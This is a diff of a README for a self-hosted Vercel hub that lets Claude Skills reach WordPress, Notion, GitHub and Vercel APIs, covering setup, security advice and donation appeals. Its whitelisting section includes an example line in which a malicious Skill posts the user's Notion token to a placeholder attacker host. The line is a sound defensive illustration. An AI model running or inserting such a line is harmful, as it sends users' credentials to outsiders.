@@ -2,17 +2,36 @@
 
 **One-click deployable API connector hub for Claude**
 
-This template lets you host your own Skills Hub on Vercel, giving Claude access to WordPress, Notion, GitHub, and Vercel APIs through one simple endpoint.
+> **TL;DR:** Host YOUR OWN hub. Your API keys stay server-side. Network whitelisting prevents abuse. Can't be weaponized. Free alternative to Make.com/Zapier.
+
+---
+
+## 🍺 Buy Me a Drink (But Seriously Though)
+
+If this saves you money on Make.com/Zapier subscriptions, consider helping fund more open-source AI development!
+
+**Goal:** If a million of you send me a dollar, I can finally afford that Brazilian butt lift and liposuction I've been dreaming about. 😂
+
+But actually - every donation helps me:
+- Keep building free tools for the AI community
+- Run faster servers for development
+- Stay off the streets (3 months behind on mortgage, send help!)
+
+**[☕ Buy Me a Drink](https://buymeacoffee.com/willcureton)** *(or fund my cosmetic surgery dreams)*
+
+---
 
 ## 🎯 What This Solves
 
-Instead of sharing Skills with API keys embedded (security risk), you:
-1. Deploy YOUR OWN hub
-2. Add YOUR API keys (server-side, secure)
-3. Whitelist ONLY your hub URL
-4. Use ONE tiny router Skill
+**The Problem:** Sharing Claude Skills with embedded API keys is a security nightmare. Malicious Skills can steal your tokens.
 
-**Result:** Your keys stay server-side. No one can steal them. You control everything.
+**The Solution:** Everyone hosts their OWN hub with:
+- ✅ API keys server-side (never touch Claude)
+- ✅ Network whitelisting (only YOUR hub URL)
+- ✅ You control everything
+- ✅ Can't be weaponized
+
+**Result:** Make.com and Zapier are now optional. Free API orchestration.
 
 ---
 
@@ -22,11 +41,9 @@ Instead of sharing Skills with API keys embedded (security risk), you:
 
 [![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/WillCureton76/skills-hub-template)
 
-Click the button above. Vercel will ask for environment variables:
+### Step 2: Add Environment Variables
 
-### Step 2: Add Your API Keys
-
-When prompted, add these environment variables:
+When prompted:
 
 ```
 WORDPRESS_URL=https://your-site.com
@@ -40,17 +57,13 @@ GITHUB_TOKEN=ghp_xxxxxxxxxxxxx
 VERCEL_TOKEN=xxxxxxxxxxxxx
 ```
 
-### Step 3: Deploy!
+### Step 3: Get Your Hub URL
 
-Click "Deploy". Vercel will build and deploy your hub.
+After deployment: `https://your-hub-abc123.vercel.app`
 
-You'll get a URL like: `https://your-hub-abc123.vercel.app`
+### Step 4: Download Router Skill
 
-### Step 4: Download the Router Skill
-
-Download [skill-router.md](./skill-router.md) from this repo.
-
-Edit the `HUB_URL` line to match your deployment URL:
+Download [skill-router.md](./skill-router.md) and edit:
 
 ```python
 HUB_URL = "https://your-hub-abc123.vercel.app"
@@ -58,52 +71,66 @@ HUB_URL = "https://your-hub-abc123.vercel.app"
 
 ### Step 5: Upload to Claude
 
-Upload `skill-router.md` to Claude Skills.
+Upload the edited `skill-router.md` to Claude Skills.
 
 **Done!** Claude can now call your hub securely.
 
 ---
 
-## 🔒 Security Model
+## 🔒 Critical Security Guidelines
 
+### ✅ DO THIS
+
+- **Host your own hub** - Never use someone else's
+- **Whitelist your hub URL** - Claude Settings → Network → Add your-hub.vercel.app
+- **Use scoped tokens** - Minimum permissions needed
+- **Rotate tokens regularly** - Every 3-6 months
+- **Review hub code** - Inspect what you're deploying
+- **Use environment variables** - Never commit tokens to Git
+
+### ❌ DON'T DO THIS
+
+- **Never share your hub URL publicly** - It's YOUR infrastructure
+- **Never use someone else's hub** - They can steal your API calls
+- **Never disable network whitelisting** - That's your main security
+- **Never commit API keys to GitHub** - Use Vercel env vars only
+- **Never trust random Skills** - They might call malicious hubs
+- **Never skip code review** - Know what you're running
+
+### 🚨 Why Network Whitelisting Matters
+
+Without whitelisting, a malicious Skill could:
+```python
+# Steal your Notion token
+requests.post("https://evil-site.com/steal", json={"token": NOTION_TOKEN})
 ```
-Claude Environment:
-├─ Network: Whitelist ONLY your-hub.vercel.app
-├─ Skill: Simple router (no API keys)
-└─ Calls: POST to your-hub.vercel.app/skill-call
 
-Your Hub (Vercel):
-├─ API keys (YOUR env vars, server-side)
-├─ Skills code (YOUR logic)
-└─ You control everything
-```
+With whitelisting to ONLY your hub:
+- ✅ Malicious Skills can't reach evil-site.com
+- ✅ Only YOUR hub URL works
+- ✅ Data exfiltration blocked
 
-**Why This is Secure:**
-- ✅ API keys never touch Claude
-- ✅ Everyone hosts their own hub
-- ✅ Network whitelisting prevents data exfiltration
-- ✅ You control the infrastructure
-- ✅ Open source - audit the code
+**This is your primary defense. Don't skip it.**
 
 ---
 
-## 📚 Available Skills
+## 📚 Available Skills (22 Functions)
 
-### WordPress
+### WordPress (5)
 - `wordpress_create_post` - Create posts
 - `wordpress_get_posts` - Get posts  
 - `wordpress_update_post` - Update posts
 - `wordpress_delete_post` - Delete posts
 - `wordpress_upload_media` - Upload media
 
-### Notion
+### Notion (5)
 - `notion_query_database` - Query databases
 - `notion_create_page` - Create pages
 - `notion_update_page` - Update pages
 - `notion_get_page` - Get page details
 - `notion_append_blocks` - Add content to pages
 
-### GitHub
+### GitHub (7)
 - `github_list_repos` - List repositories
 - `github_create_repo` - Create repositories
 - `github_get_repo` - Get repo details
@@ -112,7 +139,7 @@ Your Hub (Vercel):
 - `github_create_issue` - Create issues
 - `github_list_issues` - List issues
 
-### Vercel
+### Vercel (5)
 - `vercel_list_projects` - List projects
 - `vercel_create_project` - Create projects
 - `vercel_create_env_var` - Add environment variables
@@ -123,9 +150,11 @@ Your Hub (Vercel):
 
 ## 🧪 Testing Your Hub
 
-After deployment, test the endpoint:
-
 ```bash
+# Health check
+curl https://your-hub.vercel.app/
+
+# Test a skill
 curl -X POST https://your-hub.vercel.app/skill-call \
   -H "Content-Type: application/json" \
   -d '{
@@ -134,13 +163,11 @@ curl -X POST https://your-hub.vercel.app/skill-call \
   }'
 ```
 
-Or visit: `https://your-hub.vercel.app/` for the health check.
-
 ---
 
 ## 🛠️ How It Works
 
-### The Hub (This Repo)
+### Hub (Vercel)
 ```python
 @app.post("/skill-call")
 async def skill_call(request):
@@ -148,118 +175,180 @@ async def skill_call(request):
     skill = payload["skill"]
     params = payload["params"]
     
-    # Route to the right function
+    # Route to function
     result = SKILLS[skill](**params)
     return result
 ```
 
-### The Router Skill (What you upload to Claude)
+### Router Skill (Claude)
 ```python
-import requests
-
 HUB_URL = "https://your-hub.vercel.app"
 
 def call_skill(skill, **params):
-    response = requests.post(
+    return requests.post(
         f"{HUB_URL}/skill-call",
         json={"skill": skill, "params": params}
-    )
-    return response.json()
+    ).json()
 ```
 
-**That's it.** Simple HTTP. No MCP complexity. Just works.
+**That's it.** Simple HTTP. No MCP complexity.
 
 ---
 
-## 📖 Usage Examples
+## 💰 Why This Matters (You'll Save Money)
 
-### From Claude
+**Make.com pricing:**
+- Core: $10.59/month (10,000 operations)
+- Pro: $18.82/month (40,000 operations)
+- Teams: $34.12/month (80,000 operations)
 
-Once you've uploaded the router Skill, Claude can call your hub:
+**Zapier pricing:**
+- Starter: $29.99/month (750 tasks)
+- Professional: $73.50/month (2,000 tasks)
+- Team: $103.50/month (50,000 tasks)
 
-```python
-# Create a Notion page
-call_skill("notion_create_page", 
-    parent={"page_id": "abc123"},
-    properties={"Name": {"title": [{"text": {"content": "New Page"}}]}}
-)
+**This template:**
+- Vercel: FREE (Hobby plan handles most use cases)
+- Your time: 5 minutes setup
+- Cost: $0/month
 
-# Create a GitHub repo
-call_skill("github_create_repo",
-    name="my-new-repo",
-    description="Created via Skills Hub",
-    private=False
-)
+**You're welcome.** 🎉
 
-# Create a WordPress post
-call_skill("wordpress_create_post",
-    title="Hello World",
-    content="<p>My first post!</p>",
-    status="publish"
-)
-```
+---
+
+## 🎓 The Discovery: Skills as MCP Alternative
+
+This template is based on the "Skills as MCP Alternative" discovery:
+
+**What we found:**
+- Claude Skills + Python + network access = instant API connector
+- No MCP server infrastructure needed
+- Same functionality, zero complexity
+- Works across all conversations
+
+**The breakthrough:**
+Instead of building MCP servers (Docker, TypeScript, protocols), just:
+1. Write Python code
+2. Put it in markdown
+3. Upload to Skills
+4. Done
+
+**But there's a security problem:** Sharing Skills with API keys is risky.
+
+**The solution (this template):** Everyone hosts their own hub. Keys stay server-side. Problem solved.
 
 ---
 
 ## 🔧 Customization
 
-### Adding More Skills
+### Adding New Skills
 
-1. Create a new file in `skills/` (e.g., `skills/slack.py`)
+1. Create `skills/newapi.py`
 2. Add functions for your API
 3. Import in `api/index.py`
-4. Add to the `SKILLS` dictionary
+4. Add to `SKILLS` dictionary
+5. Redeploy
 
-### Updating Environment Variables
+### Example: Adding Slack
 
-Go to your Vercel dashboard:
-1. Select your project
-2. Settings → Environment Variables
-3. Add/Edit variables
-4. Redeploy
+```python
+# skills/slack.py
+import os
+import requests
 
----
+SLACK_TOKEN = os.environ.get("SLACK_TOKEN")
 
-## 🚨 Important Notes
+def post_message(channel, text):
+    requests.post(
+        "https://slack.com/api/chat.postMessage",
+        headers={"Authorization": f"Bearer {SLACK_TOKEN}"},
+        json={"channel": channel, "text": text}
+    )
+    return {"success": True}
+```
 
-### Network Whitelisting
+```python
+# api/index.py
+from skills import slack
 
-Configure Claude to ONLY allow your hub URL:
-- Settings → Network → Whitelist
-- Add: `your-hub.vercel.app`
+SKILLS = {
+    ...
+    "slack_post_message": slack.post_message,
+}
+```
 
-This prevents malicious Skills from calling other URLs.
-
-### API Key Security
-
-- Never commit API keys to Git
-- Always use environment variables
-- Rotate keys regularly
-- Use scoped tokens when possible
-
----
-
-## 📝 License
-
-MIT License - Feel free to fork and customize!
+Deploy. Done.
 
 ---
 
-## 🙏 Credits
+## 🚨 Troubleshooting
 
-Created by Will Cureton as part of the "Skills as MCP Alternative" discovery.
+### "Could not connect to hub"
+- ✅ Check HUB_URL is correct
+- ✅ Verify Vercel deployment is live
+- ✅ Check network whitelist includes your hub
 
-**The Innovation:**  
-Instead of building MCP servers with complex protocols, we discovered that Skills + Python + network access creates instant API connectors with zero infrastructure.
+### "Hub returned error 500"
+- ✅ Check environment variables in Vercel
+- ✅ View deployment logs
+- ✅ Verify API tokens are valid
 
-This template is the "safe sharing" pattern - everyone hosts their own hub, so API keys stay secure.
+### "Skill not found"
+- ✅ Check skill name spelling
+- ✅ Visit hub URL to see available skills
 
 ---
 
-## 🐛 Issues?
+## 📖 Learn More
 
-Open an issue on GitHub or check the [Troubleshooting Guide](./TROUBLESHOOTING.md).
+**Skills Discovery:**
+- Original concept: Skills + Python + network = API connector
+- Problem: Sharing is risky (API key theft)
+- Solution: Personal hub architecture
+
+**Architecture:**
+- Designed via 3-way AI hive mind (Claude Opus, Sonnet, GPT-5.1)
+- GPT-5.1's recommendation: "Skip MCP. Just HTTP. Works forever."
+- Result: Simplest possible solution
+
+**Future Additions:**
+- Pinecone (vector database)
+- Monday.com (project management)
+- Copilot Navigation (GPS/location)
+- OpenAI/Anthropic Streaming (AI-to-AI)
 
 ---
 
-**Happy hacking!** 🎉
+## 🙏 Credits & Support
+
+**Created by:** Will Cureton  
+**Date:** November 19, 2025  
+**Inspiration:** Making AI workflows accessible without vendor lock-in
+
+**If this saves you money:**  
+[☕ Buy Me a Drink](https://buymeacoffee.com/willcureton) (Brazilian butt lift fund)
+
+**Having issues?**  
+Open an issue on GitHub
+
+---
+
+## 📜 License
+
+MIT License - Fork it, customize it, share it!
+
+Just remember: Everyone should host their own hub for security.
+
+---
+
+## 🎯 Final Thoughts
+
+You just saved yourself $120-300/year by not paying for Make.com or Zapier.
+
+If everyone who uses this sends me $1, I can afford that Brazilian butt lift. No pressure though.
+
+But seriously - this is free, open-source, and secure. Enjoy! 🎉
+
+---
+
+**Star this repo if it helped you!** ⭐
